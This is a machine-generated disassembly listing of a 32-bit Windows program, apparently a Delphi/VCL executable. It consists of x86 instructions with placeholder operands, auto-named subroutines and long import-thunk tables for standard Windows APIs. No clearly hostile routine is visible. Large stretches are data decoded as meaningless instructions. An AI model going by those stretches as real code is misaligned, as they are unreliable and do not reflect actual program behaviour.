or esp [ ebx + 0x721d1d0e ]
jb r-xdata
call GetLocalTime
cmp [ rw-data ] 0x7e1
jb r-xdata
add al [ eax ]
jb r-xdata
imul eax [ edx ] 0x0
add [ eax - 0x17ff9570 ] dl
cli
jle r-xdata
jb r-xdata
add [ eax - 0x1c ] ch
sbb eax [ esi ]
jb r-xdata
push 0x0
call GetTextColor
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call ScaleWindowExtEx
call GetLastError
mov [ rw-data ] eax
nop
nop
lea edx [ ebp - 0x4 ]
xor eax eax
call sub_4029e4
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_40bf7c
test eax eax
je r-xdata
[ edx ]
movsb [ edi ] [ esi ]
xchg esi eax
or bh [ ecx - 0x75e2e2de ]
add esp eax
and eax 0xea30b53
sub_45e591
arpl [ ecx + 0x56 ] bp
xor ecx [ ecx + 0x65 ]
bound eax [ edx + 0x6d ]
bound ebp [ edi + 0x7a ]
add [ eax ] al
add [ ecx ] dh
push eax
ja r-xdata
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
jns r-xdata
retn
dec ebp
arpl [ fs : edi + 0x43 ] si
dec esp
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e5f6
mov [ eax ] esp
jpe r-xdata
add [ eax ] al
out 0x45 al
jns r-xdata
add [ ebx + ebx * 2 + 0x5b380040 ] cl
inc eax
add [ eax ] dl
pop esi
push edi
cmp [ esi + 0x49 ] dl
add [ eax ] al
inc edi
je r-xdata
add [ eax + 0x6800405d ] bl
pop ebp
jne r-xdata
inc eax
add [ ebp + ebp * 2 - 0x2e67ffc0 ] al
inc eax
add [ eax ] bl
mov ah 0x6d
jae r-xdata
rol [ eax ] 0x1
add al 0xda
inc eax
add ah dl
fld [ eax ]
lodsb [ esi ]
add eax [ ecx ]
xor al 0x3
inc ecx
add [ eax + 0x5 ] dh
inc ecx
add [ eax + 0x5 ] al
inc ecx
add [ eax + 0xd ] bl
inc ecx
add [ eax ] cl
or eax 0xa4cc0041
inc ecx
add [ esp ] bl
inc ecx
add al ch
sbb eax [ edx ]
mov eax 0xa000421b
push ds
inc edx
add [ eax + 0x1e ] dh
inc edx
add [ edi + esi + 0x42 ] cl
add [ edi + esi ] cl
inc edx
add [ edi ] dl
inc edx
add ah ah
inc edx
add [ edi + ebx + 0x1f640042 ] dl
inc edx
add al dh
cmpsd [ esi ] [ edi ]
inc ecx
add al al
cmpsd [ esi ] [ edi ]
inc ecx
add [ edx + ebx + 0x19d80042 ] ch
inc edx
add [ eax + ebx * 2 ] cl
inc esp
add ah bl
push edi
inc esp
add [ edi + 0x42 ] dl
add [ edi ] ah
inc edx
add al cl
mov ebp 0xbd580044
inc esp
add [ esp + edi + 0x3c5c0042 ] cl
inc edx
add [ esi + eax * 2 ] dh
inc edx
add al ah
inc ebp
inc edx
add [ eax + 0x68004247 ] bl
inc edi
inc edx
add [ eax + 0x47 ] ah
inc edx
add [ eax ] dh
inc edi
inc edx
add [ eax ] ch
inc edi
inc edx
add al bh
inc esi
inc edx
add al dh
inc esi
inc edx
add al al
inc esi
inc edx
add [ eax + ecx * 2 ] al
inc edx
add ah dl
inc edi
inc edx
add [ edx - 0x5d93ffbe ] bl
inc edx
add [ eax + edx ] ah
inc ebx
add ah dh
cmovae eax [ eax ]
test [ edi ] dh
inc edx
add [ edi + esi + 0x42 ] dl
add al cl
aaa
inc edx
add [ edi + esi + 0x484c0042 ] cl
inc edx
add [ eax + ecx * 2 ] bl
inc edx
add [ eax + ecx * 2 + 0x48540042 ] al
inc edx
add ah ah
pop edi
inc edx
add [ eax + 0x7400425f ] cl
sahf
inc edx
add [ esi + ebx * 4 ] ch
inc edx
add [ eax - 0x77ffbdba ] bh
inc esi
inc edx
add [ eax + 0x50004246 ] al
inc esi
inc edx
add [ eax ] bh
mov eax [ 0xffffffffa0f00042 ]
inc edx
add [ eax + 0x580042a1 ] ah
mov eax [ 0xffffffffa0780042 ]
inc edx
add [ eax - 0x60 ] al
inc edx
add al dl
mov al [ 0xffffffffa0a00042 ]
inc edx
add [ eax + 0x7000429f ] ah
lahf
inc edx
add [ eax ] bl
lahf
inc edx
add ah bl
sahf
inc edx
add [ ecx + edx + 0x115c0043 ] cl
inc ebx
add [ edx ] cl
inc edx
add [ ecx - 0x5d9bffbe ] bh
inc edx
add [ edx ] dl
inc edx
add ah dl
sahf
inc edx
add [ esi + ebx * 4 - 0x5be3ffbe ] ah
inc edx
add [ ebx - 0x50efffbe ] ah
inc edx
add ah cl
scasb [ edi ]
inc edx
add [ eax + 0x2b ] cl
inc esp
add al ah
sub al [ eax + eax + 0x4 ]
inc ecx
inc esp
add ah dl
inc eax
inc esp
add [ eax + 0x1e ] bl
inc ebx
add al ah
sbb eax 0x3ae00043
inc edx
add [ eax + 0x1c00423a ] dh
add [ ebp ] 0xc0
add [ ebp ] r-xdata
mov dl ah
inc ebp
add [ eax ] al
add [ eax ] al
add al dl
in eax 0x45
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff0
mov eax r-xdata
call sub_405d24
mov eax [ rw-data ]
mov eax [ eax ]
call sub_456cc0
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_456cd8
mov eax [ rw-data ]
mov eax [ eax ]
call sub_456d58
call sub_403e7c
add [ ebp + ebp * 2 + 0x6d840040 ] dh
inc eax
add [ eax + 0x180040d1 ] bl
jb r-xdata
inc eax
add al ah
pop ebp
inc eax
add [ edx + ebp * 2 + 0x40 ] ch
add [ edx + ebp * 2 ] bh
inc eax
add [ edx + ebp * 2 + 0x6a740040 ] ah
inc eax
add [ eax + 0x6000410d ] dl
or eax 0x6db40041
outsd
jae r-xdata
add [ eax ] al
add [ ebp + 0x73 ] dh
jb r-xdata
inc eax
cwde
pop ebp
inc eax
add [ eax + 0x5d ] ch
xor al [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
_start
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax r-xdata
call sub_405d24
mov eax [ rw-data ]
mov eax [ eax ]
call sub_456cc0
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_456cd8
mov eax [ rw-data ]
mov eax [ eax ]
call sub_456d58
call sub_403e7c
sub_40114f
add [ esp + 0x4 ] 0xfffffff8
jmp sub_40567c
sub_401159
add [ esp + 0x4 ] 0xfffffff8
jmp sub_405690
ExitProcess
jmp [ __import_lookup_table_0(kernel32:ExitProcess) ]
sub_40122c
jmp [ __import_lookup_table_1(user32:MessageBoxA) ]
FindClose
jmp [ __import_lookup_table_0(kernel32:FindClose) ]
FindFirstFileA
jmp [ __import_lookup_table_0(kernel32:FindFirstFileA) ]
sub_401244
jmp [ __import_lookup_table_0(kernel32:FreeLibrary) ]
GetCommandLineA
jmp [ __import_lookup_table_0(kernel32:GetCommandLineA) ]
sub_401254
jmp [ __import_lookup_table_0(kernel32:GetLocaleInfoA) ]
sub_40125c
jmp [ __import_lookup_table_0(kernel32:GetModuleFileNameA) ]
sub_401264
jmp [ __import_lookup_table_0(kernel32:GetModuleHandleA) ]
sub_40126c
jmp [ __import_lookup_table_0(kernel32:GetProcAddress) ]
GetStartupInfoA
jmp [ GetStartupInfoA@IAT ]
sub_40128c
jmp [ __import_lookup_table_1(user32:LoadStringA) ]
MultiByteToWideChar
jmp [ __import_lookup_table_0(kernel32:MultiByteToWideChar) ]
sub_4012ac
jmp [ __import_lookup_table_2(advapi32:RegCloseKey) ]
WideCharToMultiByte
jmp [ WideCharToMultiByte@IAT ]
sub_4012cc
jmp [ __import_lookup_table_0(kernel32:VirtualQuery) ]
SysAllocStringLen
jmp [ SysAllocStringLen@IAT ]
SysReAllocStringLen
jmp [ SysReAllocStringLen@IAT ]
SysFreeString
jmp [ SysFreeString@IAT ]
InterlockedIncrement
jmp [ __import_lookup_table_0(kernel32:InterlockedIncrement) ]
InterlockedDecrement
jmp [ InterlockedDecrement@IAT ]
sub_4012fc
jmp [ __import_lookup_table_0(kernel32:GetCurrentThreadId) ]
sub_40130c
push ebx
add esp 0xffffffbc
mov ebx 0xa
push esp
call GetStartupInfoA
test [ esp + 0x2c ] 0x1
je r-xdata
mov eax ebx
add esp 0x44
pop ebx
retn
movzx ebx [ esp + 0x30 ]
sub_401330
jmp [ __import_lookup_table_0(kernel32:LocalAlloc) ]
VirtualFree
jmp [ VirtualFree@IAT ]
sub_401350
jmp [ __import_lookup_table_0(kernel32:InitializeCriticalSection) ]
sub_401358
jmp [ __import_lookup_table_0(kernel32:EnterCriticalSection) ]
sub_401360
jmp [ __import_lookup_table_0(kernel32:LeaveCriticalSection) ]
sub_401368
jmp [ __import_lookup_table_0(kernel32:DeleteCriticalSection) ]
sub_401ab9
mov al [ rw-data ]
pop ebp
retn
sub_401c64
inc [ rw-data ]
mov edx eax
sub edx 0x4
mov edx [ edx ]
and edx 0x7ffffffc
sub edx 0x4
add [ rw-data ] edx
call sub_402278
retn
sub_40276c
call sub_405cd8
cmp [ eax ] 0x0
je r-xdata
xor eax eax
retn
call sub_405cd8
mov eax [ eax ]
mov eax [ eax + 0x4 ]
retn
sub_4027c0
mov [ rw-data ] edx
call sub_403f54
sub_402824
push eax
push edx
push ecx
call sub_405cd8
cmp [ eax + 0x4 ] 0x0
pop ecx
pop edx
pop eax
jne r-xdata
xor eax eax
jmp sub_402818
retn
sub_402840
retn
sub_402894
retn
sub_402898
push ebx
call sub_405cd8
mov ebx [ eax + 0x4 ]
call sub_405cd8
xor edx edx
mov [ eax + 0x4 ] edx
mov eax ebx
pop ebx
retn
sub_402a44
mov [ rw-data ] ax
fnclex
fldcw [ rw-data ]
retn
sub_402a54
push 0x0
fnstcw [ esp ]
pop eax
retn
sub_402acc
mov edx [ eax + 0x1c ]
call sub_402a84
retn
sub_402d34
mov ecx 0xff
call sub_402d40
retn
sub_402d64
push esi
push edi
mov esi eax
mov edi edx
and ecx 0xff
[ esi ] [ edi ]
pop edi
pop esi
retn
j_sub_402d80
jmp sub_402d80
sub_402d7d
retn
sub_403160
fninit
fwait
fldcw [ rw-data ]
retn
sub_40316c
mov al 0x4
jmp sub_402818
sub_4031c0
mov eax [ eax - 0x24 ]
test eax eax
je r-xdata
retn
mov eax [ eax ]
sub_4031cc
push ebx
mov ebx eax
mov eax ebx
call sub_4031fc
call sub_4026bc
mov edx eax
mov eax ebx
call sub_403240
pop ebx
retn
sub_4031e8
push ebx
mov ebx eax
mov eax ebx
call sub_403298
mov eax ebx
call sub_4026dc
pop ebx
retn
sub_4031fc
add eax 0xffffffd8
mov eax [ eax ]
retn
sub_403224
call sub_4035a8
test dl dl
jle r-xdata
retn
call sub_403590
sub_4032e4
retn
sub_403373
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_403464
mov eax 0x8000ffff
retn
sub_40346c
retn
sub_403470
retn
sub_403474
retn
sub_403569
jmp sub_4036bc
sub_40356e
mov eax [ esp + 0x2c ]
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
call sub_4039d0
retn
mov ecx [ eax ]
mov dl 0x81
push eax
call [ ecx - 0x4 ]
pop eax
call sub_403590
sub_403590
mov edx [ eax ]
call [ edx - 0x8 ]
retn
sub_403598
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx - 0x1c ]
mov eax ebx
pop ebx
retn
sub_4035a8
test dl dl
jg r-xdata
push eax
push edx
mov edx [ eax ]
call [ edx - 0x18 ]
pop edx
pop eax
retn
retn
sub_4035b8
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push 0x0
push 0x0
push 0x0
push 0xeedfadf
call [ rw-data ]
sub_403680
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push edx
push esp
push 0x1
push 0x0
push 0xeedfae2
call [ rw-data ]
pop edx
sub_40369c
push eax
push edx
cmp [ rw-data ] 0x1
jbe r-xdata
pop edx
pop eax
retn
push esp
push 0x2
push 0x0
push 0xeedfae3
call [ rw-data ]
sub_403a69
retn
sub_403b08
pop ebp
retn 0x4
sub_403bac
xor edx edx
lea eax [ ebp - 0xc ]
mov ecx [ fs : edx ]
mov [ fs : edx ] eax
mov [ eax ] ecx
mov [ eax + 0x4 ] sub_403b0c
mov [ eax + 0x8 ] ebp
mov [ rw-data ] eax
retn
sub_403c3a
jmp sub_4036bc
sub_403c9a
jmp sub_4036bc
sub_403cb4
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] edx
mov eax [ edx + 0x4 ]
mov [ rw-data ] eax
call sub_403bac
mov [ rw-data ] 0x0
call sub_403c54
retn
sub_403ded
retn
sub_403f4f
pop ebp
pop edi
pop esi
pop ebx
retn
sub_403f54
mov [ rw-data ] eax
call sub_403e7c
sub_404190
retn
sub_4041cc
retn
sub_4041da
retn
sub_4041f3
retn
sub_404204
retn
sub_4042eb
retn
sub_40441c
test eax eax
je r-xdata
retn
mov edx [ eax - 0x8 ]
inc edx
jle r-xdata
[ eax - 0x8 ]
j_sub_404438#2
jmp sub_404438
sub_404481
retn
j_sub_404438
jmp sub_404438
sub_404489
retn
sub_4044cb
retn
sub_404624
test eax eax
je r-xdata
retn
push eax
push 0x0
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402818
sub_40463c
xchg [ eax ] edx
test edx edx
je r-xdata
retn
push edx
call SysFreeString
sub_404794
retn
sub_4047a6
retn
sub_4047a8
test eax eax
je r-xdata
mov eax r-xdata
retn
retn
sub_4049d0
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402818
call [ rw-data ]
retn
sub_404ad4
mov ecx 0x1
jmp sub_4049e8
sub_404ade
retn
sub_404ae0
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402818
call [ rw-data ]
retn
sub_404d06
retn
sub_404d08
mov al 0x11
jmp sub_402818
sub_404d33
retn
sub_404d44
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_404c14
pop ebp
retn 0x4
j_sub_4049e8
jmp sub_4049e8
sub_404d59
retn
sub_404d5c
call sub_404efc
retn
sub_404f88
call sub_404f60
retn
sub_40543c
call sub_40544c
retn
sub_405444
call sub_40546c
retn
sub_40544c
push ebx
mov ebx eax
mov eax 0x8
call sub_4026bc
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
pop ebx
retn
sub_405507
jmp sub_4036bc
sub_405528
mov edx [ rw-data ]
mov [ eax ] edx
mov [ rw-data ] eax
retn
sub_4055a3
pop ecx
pop ebp
retn
sub_40561c
test eax eax
je r-xdata
retn
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
sub_405628
add eax 0x4
push eax
call InterlockedDecrement
retn
sub_405634
cmp [ eax + 0x4 ] 0x0
je r-xdata
retn
mov al 0x2
call sub_402818
sub_405644
call sub_4031cc
mov [ eax + 0x4 ] 0x1
retn
sub_40567c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x4
push eax
call InterlockedIncrement
pop ebp
retn 0x4
sub_405972
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405a16
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405a66
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405b31
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_405b89
pop ebp
retn
sub_405c60
jmp [ __import_lookup_table_4(kernel32:GetModuleHandleA) ]
LocalAlloc
jmp [ __import_lookup_table_4(kernel32:LocalAlloc) ]
TlsSetValue
jmp [ __import_lookup_table_4(kernel32:TlsSetValue) ]
sub_405c80
push eax
push 0x40
call LocalAlloc
retn
sub_405c8c
mov eax 0x10
retn
sub_405d18
mov eax rw-data
call sub_405528
retn
sub_405d94
pop ebp
retn
sub_405d98
sub [ rw-data ] 0x1
retn
sub_405da0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] ecx
pop ebx
pop ebp
retn 0x8
sub_405dbc
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
retn
sub_405e0c
pop ebp
retn
sub_405e10
sub [ rw-data ] 0x1
retn
RegCloseKey
jmp [ RegCloseKey@IAT ]
RegOpenKeyExA
jmp [ RegOpenKeyExA@IAT ]
RegQueryValueExA
jmp [ __import_lookup_table_5(advapi32:RegQueryValueExA) ]
CompareStringA
jmp [ __import_lookup_table_6(kernel32:CompareStringA) ]
CreateFileA
jmp [ __import_lookup_table_6(kernel32:CreateFileA) ]
CreateThread
jmp [ __import_lookup_table_6(kernel32:CreateThread) ]
FindResourceA
jmp [ FindResourceA@IAT ]
FormatMessageA
jmp [ __import_lookup_table_6(kernel32:FormatMessageA) ]
InterlockedExchange
jmp [ InterlockedExchange@IAT ]
FreeResource
jmp [ FreeResource@IAT ]
GetACP
jmp [ GetACP@IAT ]
GetCPInfo
jmp [ GetCPInfo@IAT ]
GetCurrentProcessId
jmp [ GetCurrentProcessId@IAT ]
GetDateFormatA
jmp [ GetDateFormatA@IAT ]
GetDiskFreeSpaceA
jmp [ __import_lookup_table_6(kernel32:GetDiskFreeSpaceA) ]
GetFullPathNameA
jmp [ __import_lookup_table_6(kernel32:GetFullPathNameA) ]
GetLocaleInfoA
jmp [ GetLocaleInfoA@IAT ]
GetModuleHandleA
jmp [ GetModuleHandleA@IAT ]
GetStringTypeExA
jmp [ GetStringTypeExA@IAT ]
GetSystemInfo
jmp [ GetSystemInfo@IAT ]
GetVersion
jmp [ GetVersion@IAT ]
GetVersionExA
jmp [ GetVersionExA@IAT ]
GlobalAlloc
jmp [ GlobalAlloc@IAT ]
GlobalFindAtomA
jmp [ GlobalFindAtomA@IAT ]
GlobalFree
jmp [ GlobalFree@IAT ]
GlobalLock
jmp [ __import_lookup_table_6(kernel32:GlobalLock) ]
GlobalHandle
jmp [ GlobalHandle@IAT ]
GlobalReAlloc
jmp [ __import_lookup_table_6(kernel32:GlobalReAlloc) ]
GlobalUnlock
jmp [ GlobalUnlock@IAT ]
LeaveCriticalSection
jmp [ __import_lookup_table_6(kernel32:LeaveCriticalSection) ]
LoadLibraryA
jmp [ __import_lookup_table_6(kernel32:LoadLibraryA) ]
LoadResource
jmp [ __import_lookup_table_6(kernel32:LoadResource) ]
LockResource
jmp [ __import_lookup_table_6(kernel32:LockResource) ]
ReadFile
jmp [ ReadFile@IAT ]
ResetEvent
jmp [ __import_lookup_table_6(kernel32:ResetEvent) ]
SetEndOfFile
jmp [ SetEndOfFile@IAT ]
SetEvent
jmp [ SetEvent@IAT ]
SetFilePointer
jmp [ SetFilePointer@IAT ]
SetThreadLocale
jmp [ __import_lookup_table_6(kernel32:SetThreadLocale) ]
SizeofResource
jmp [ __import_lookup_table_6(kernel32:SizeofResource) ]
sub_4060bc
jmp [ __import_lookup_table_6(kernel32:Sleep) ]
VirtualAlloc
jmp [ __import_lookup_table_6(kernel32:VirtualAlloc) ]
VirtualProtect
jmp [ VirtualProtect@IAT ]
VirtualQuery
jmp [ VirtualQuery@IAT ]
WaitForSingleObject
jmp [ WaitForSingleObject@IAT ]
lstrcpyA
jmp [ lstrcpyA@IAT ]
GetFileVersionInfoA
jmp [ __import_lookup_table_7(version:GetFileVersionInfoA) ]
GetFileVersionInfoSizeA
jmp [ __import_lookup_table_7(version:GetFileVersionInfoSizeA) ]
VerQueryValueA
jmp [ __import_lookup_table_7(version:VerQueryValueA) ]
CreateBitmap
jmp [ CreateBitmap@IAT ]
CreateBrushIndirect
jmp [ CreateBrushIndirect@IAT ]
CreateDIBSection
jmp [ CreateDIBSection@IAT ]
CreateDIBitmap
jmp [ CreateDIBitmap@IAT ]
CreateHalftonePalette
jmp [ CreateHalftonePalette@IAT ]
CreatePalette
jmp [ CreatePalette@IAT ]
CreatePenIndirect
jmp [ CreatePenIndirect@IAT ]
ExcludeClipRect
jmp [ __import_lookup_table_8(gdi32:ExcludeClipRect) ]
ExtTextOutA
jmp [ ExtTextOutA@IAT ]
GetBrushOrgEx
jmp [ GetBrushOrgEx@IAT ]
GetClipBox
jmp [ GetClipBox@IAT ]
GetCurrentPositionEx
jmp [ GetCurrentPositionEx@IAT ]
GetDCOrgEx
jmp [ __import_lookup_table_8(gdi32:GetDCOrgEx) ]
GetDIBColorTable
jmp [ GetDIBColorTable@IAT ]
GetPixel
jmp [ __import_lookup_table_8(gdi32:GetPixel) ]
GetTextExtentPoint32A
jmp [ GetTextExtentPoint32A@IAT ]
GetWindowOrgEx
jmp [ GetWindowOrgEx@IAT ]
LineTo
jmp [ LineTo@IAT ]
MaskBlt
jmp [ __import_lookup_table_8(gdi32:MaskBlt) ]
MoveToEx
jmp [ __import_lookup_table_8(gdi32:MoveToEx) ]
Polyline
jmp [ Polyline@IAT ]
RectVisible
jmp [ __import_lookup_table_8(gdi32:RectVisible) ]
ScaleWindowExtEx
jmp [ ScaleWindowExtEx@IAT ]
SelectClipRgn
jmp [ SelectClipRgn@IAT ]
SetBrushOrgEx
jmp [ __import_lookup_table_8(gdi32:SetBrushOrgEx) ]
SetDIBColorTable
jmp [ SetDIBColorTable@IAT ]
SetPixel
jmp [ __import_lookup_table_8(gdi32:SetPixel) ]
SetROP2
jmp [ SetROP2@IAT ]
SetViewportOrgEx
jmp [ SetViewportOrgEx@IAT ]
SetWindowOrgEx
jmp [ SetWindowOrgEx@IAT ]
UnrealizeObject
jmp [ UnrealizeObject@IAT ]
ActivateKeyboardLayout
jmp [ __import_lookup_table_9(user32:ActivateKeyboardLayout) ]
AdjustWindowRectEx
jmp [ AdjustWindowRectEx@IAT ]
CharLowerA
jmp [ __import_lookup_table_9(user32:CharLowerA) ]
BeginDeferWindowPos
jmp [ __import_lookup_table_9(user32:BeginDeferWindowPos) ]
BeginPaint
jmp [ BeginPaint@IAT ]
CallNextHookEx
jmp [ CallNextHookEx@IAT ]
CallWindowProcA
jmp [ __import_lookup_table_9(user32:CallWindowProcA) ]
CharNextA
jmp [ __import_lookup_table_9(user32:CharNextA) ]
CharToOemA
jmp [ __import_lookup_table_9(user32:CharToOemA) ]
CheckMenuItem
jmp [ __import_lookup_table_9(user32:CheckMenuItem) ]
ClientToScreen
jmp [ __import_lookup_table_9(user32:ClientToScreen) ]
CreateIcon
jmp [ __import_lookup_table_9(user32:CreateIcon) ]
CreateMenu
jmp [ CreateMenu@IAT ]
CreatePopupMenu
jmp [ __import_lookup_table_9(user32:CreatePopupMenu) ]
DefFrameProcA
jmp [ __import_lookup_table_9(user32:DefFrameProcA) ]
DefMDIChildProcA
jmp [ __import_lookup_table_9(user32:DefMDIChildProcA) ]
DefWindowProcA
jmp [ __import_lookup_table_9(user32:DefWindowProcA) ]
DeferWindowPos
jmp [ DeferWindowPos@IAT ]
DestroyIcon
jmp [ __import_lookup_table_9(user32:DestroyIcon) ]
DestroyMenu
jmp [ __import_lookup_table_9(user32:DestroyMenu) ]
DestroyWindow
jmp [ __import_lookup_table_9(user32:DestroyWindow) ]
DispatchMessageA
jmp [ __import_lookup_table_9(user32:DispatchMessageA) ]
DrawFocusRect
jmp [ DrawFocusRect@IAT ]
DrawIcon
jmp [ __import_lookup_table_9(user32:DrawIcon) ]
DrawIconEx
jmp [ __import_lookup_table_9(user32:DrawIconEx) ]
DrawMenuBar
jmp [ DrawMenuBar@IAT ]
EnableScrollBar
jmp [ __import_lookup_table_9(user32:EnableScrollBar) ]
EnableWindow
jmp [ EnableWindow@IAT ]
EndDeferWindowPos
jmp [ __import_lookup_table_9(user32:EndDeferWindowPos) ]
EndPaint
jmp [ __import_lookup_table_9(user32:EndPaint) ]
EnumThreadWindows
jmp [ EnumThreadWindows@IAT ]
EnumWindows
jmp [ __import_lookup_table_9(user32:EnumWindows) ]
EqualRect
jmp [ __import_lookup_table_9(user32:EqualRect) ]
FindWindowA
jmp [ __import_lookup_table_9(user32:FindWindowA) ]
GetClassNameA
jmp [ __import_lookup_table_9(user32:GetClassNameA) ]
GetClientRect
jmp [ __import_lookup_table_9(user32:GetClientRect) ]
GetCursor
jmp [ GetCursor@IAT ]
GetCursorPos
jmp [ GetCursorPos@IAT ]
GetDC
jmp [ GetDC@IAT ]
GetDCEx
jmp [ __import_lookup_table_9(user32:GetDCEx) ]
GetDlgItem
jmp [ GetDlgItem@IAT ]
GetForegroundWindow
jmp [ GetForegroundWindow@IAT ]
GetIconInfo
jmp [ GetIconInfo@IAT ]
GetKeyNameTextA
jmp [ GetKeyNameTextA@IAT ]
GetKeyboardLayout
jmp [ __import_lookup_table_9(user32:GetKeyboardLayout) ]
GetKeyboardLayoutList
jmp [ __import_lookup_table_9(user32:GetKeyboardLayoutList) ]
GetKeyboardState
jmp [ __import_lookup_table_9(user32:GetKeyboardState) ]
GetLastActivePopup
jmp [ __import_lookup_table_9(user32:GetLastActivePopup) ]
GetMenu
jmp [ __import_lookup_table_9(user32:GetMenu) ]
GetMenuItemID
jmp [ GetMenuItemID@IAT ]
GetMenuItemInfoA
jmp [ GetMenuItemInfoA@IAT ]
GetMenuStringA
jmp [ __import_lookup_table_9(user32:GetMenuStringA) ]
__imp_GetWindow
jmp [ __import_lookup_table_9(user32:GetWindow) ]
GetParent
jmp [ __import_lookup_table_9(user32:GetParent) ]
GetPropA
jmp [ GetPropA@IAT ]
GetScrollInfo
jmp [ __import_lookup_table_9(user32:GetScrollInfo) ]
GetScrollPos
jmp [ __import_lookup_table_9(user32:GetScrollPos) ]
GetScrollRange
jmp [ __import_lookup_table_9(user32:GetScrollRange) ]
GetSubMenu
jmp [ __import_lookup_table_9(user32:GetSubMenu) ]
GetSysColor
jmp [ __import_lookup_table_9(user32:GetSysColor) ]
GetSysColorBrush
jmp [ __import_lookup_table_9(user32:GetSysColorBrush) ]
GetSystemMenu
jmp [ __import_lookup_table_9(user32:GetSystemMenu) ]
GetTopWindow
jmp [ __import_lookup_table_9(user32:GetTopWindow) ]
GetWindowDC
jmp [ __import_lookup_table_9(user32:GetWindowDC) ]
GetWindowPlacement
jmp [ __import_lookup_table_9(user32:GetWindowPlacement) ]
GetWindowRect
jmp [ GetWindowRect@IAT ]
GetWindowTextA
jmp [ __import_lookup_table_9(user32:GetWindowTextA) ]
__imp_GetWindowThreadProcessId
jmp [ __import_lookup_table_9(user32:GetWindowThreadProcessId) ]
GetWindowThreadProcessId
jmp [ __import_lookup_table_9(user32:GetWindowThreadProcessId) ]
InsertMenuItemA
jmp [ __import_lookup_table_9(user32:InsertMenuItemA) ]
IsChild
jmp [ __import_lookup_table_9(user32:IsChild) ]
IsDialogMessageA
jmp [ __import_lookup_table_9(user32:IsDialogMessageA) ]
IsRectEmpty
jmp [ __import_lookup_table_9(user32:IsRectEmpty) ]
IsWindow
jmp [ __import_lookup_table_9(user32:IsWindow) ]
IsWindowEnabled
jmp [ __import_lookup_table_9(user32:IsWindowEnabled) ]
IsZoomed
jmp [ IsZoomed@IAT ]
KillTimer
jmp [ KillTimer@IAT ]
LoadBitmapA
jmp [ LoadBitmapA@IAT ]
LoadIconA
jmp [ LoadIconA@IAT ]
LoadStringA
jmp [ __import_lookup_table_9(user32:LoadStringA) ]
MapVirtualKeyA
jmp [ MapVirtualKeyA@IAT ]
MessageBoxA
jmp [ __import_lookup_table_9(user32:MessageBoxA) ]
OemToCharA
jmp [ __import_lookup_table_9(user32:OemToCharA) ]
PostQuitMessage
jmp [ PostQuitMessage@IAT ]
PtInRect
jmp [ __import_lookup_table_9(user32:PtInRect) ]
RedrawWindow
jmp [ RedrawWindow@IAT ]
RegisterClassA
jmp [ RegisterClassA@IAT ]
RegisterClipboardFormatA
jmp [ RegisterClipboardFormatA@IAT ]
ReleaseCapture
jmp [ ReleaseCapture@IAT ]
ReleaseDC
jmp [ ReleaseDC@IAT ]
RemoveMenu
jmp [ RemoveMenu@IAT ]
ScrollWindow
jmp [ ScrollWindow@IAT ]
SetActiveWindow
jmp [ __import_lookup_table_9(user32:SetActiveWindow) ]
SetCapture
jmp [ SetCapture@IAT ]
SetClassLongA
jmp [ __import_lookup_table_9(user32:SetClassLongA) ]
SetForegroundWindow
jmp [ __import_lookup_table_9(user32:SetForegroundWindow) ]
SetMenuItemInfoA
jmp [ __import_lookup_table_9(user32:SetMenuItemInfoA) ]
SetParent
jmp [ __import_lookup_table_9(user32:SetParent) ]
SetScrollInfo
jmp [ __import_lookup_table_9(user32:SetScrollInfo) ]
SetScrollPos
jmp [ __import_lookup_table_9(user32:SetScrollPos) ]
SetScrollRange
jmp [ __import_lookup_table_9(user32:SetScrollRange) ]
SetTimer
jmp [ __import_lookup_table_9(user32:SetTimer) ]
SetWindowPlacement
jmp [ SetWindowPlacement@IAT ]
SetWindowTextA
jmp [ __import_lookup_table_9(user32:SetWindowTextA) ]
SetWindowsHookExA
jmp [ SetWindowsHookExA@IAT ]
ShowCursor
jmp [ ShowCursor@IAT ]
ShowOwnedPopups
jmp [ ShowOwnedPopups@IAT ]
ShowScrollBar
jmp [ ShowScrollBar@IAT ]
TrackPopupMenu
jmp [ TrackPopupMenu@IAT ]
TranslateMDISysAccel
jmp [ TranslateMDISysAccel@IAT ]
TranslateMessage
jmp [ TranslateMessage@IAT ]
UnhookWindowsHookEx
jmp [ UnhookWindowsHookEx@IAT ]
UnregisterClassA
jmp [ UnregisterClassA@IAT ]
UpdateWindow
jmp [ UpdateWindow@IAT ]
WaitMessage
jmp [ WaitMessage@IAT ]
WinHelpA
jmp [ WinHelpA@IAT ]
WindowFromPoint
